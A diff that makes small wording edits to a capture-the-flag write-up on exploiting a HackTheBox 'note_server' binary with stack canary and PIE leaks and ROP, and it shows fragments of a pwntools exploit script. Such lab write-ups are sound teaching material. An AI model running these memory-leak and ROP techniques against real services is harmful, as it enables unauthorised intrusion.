@@ -834,7 +834,7 @@ gef➤
 ```
 As we can see the note fault at `0x00007fffffffdf28`, and next address `0x00007fffffffe040` is rbp a `stack canary`. 
 Then we see the stack `canary` as a `PIE` address `0x0000555555555674`, and as we can notice this a base address from main so that's mean  `handle_client` will return, so that is address we want.
-and this `0x00007fffffffe138` location of base.
+and this `0x00007fffffffe138` location of base(return).
 
 se to know `offset` 
 ```shell
@@ -846,6 +846,8 @@ let's finish it, but in the first we explain some things
 >I forgot to explain what kind of exploitation here. This is called ROP Exploitation, is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing. 
 >
 >In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine's memory, called "gadgets". 
+
+Now, after we found return address in local compiled, let's finish the exploit code, then change from local to box 
 
 ```
 log.info("Stage One - Bypass ASLR")
@@ -869,7 +871,7 @@ ret = u64(p.recv(8))
 base = u64(p.recv(8))
 log.success(f"Return: {hex(ret)}")
 
-e.address = ret - 0x1674 #PIE base 
+e.address = ret - 0x1674 #PIE base(return address)
 
 log.info("Stage two - Find libc")
 p = remote("127.0.0.1", 5001)
@@ -1125,7 +1127,7 @@ then:
 ezi0x00@kali:~/HTB/Intense$ base64 -di libc.b64 > libc
 ezi0x00@kali:~/HTB/Intense$ base64 -di note_server.b64 > note_server
 ```
-Now we want the new `PIE` base server specific to do that after got a `note_server` debug it not local was compiled on local.
+Now we want the new `PIE` base(return address) server specific to do that after got a `note_server` debug it not local was compiled on local.
 We don't need to repeat the previous steps to get the return address, just look at the main function
 ```shell
 ezi0x00@kali:~/HTB/Intense$ gdb note_server -ex 'disassemble main'
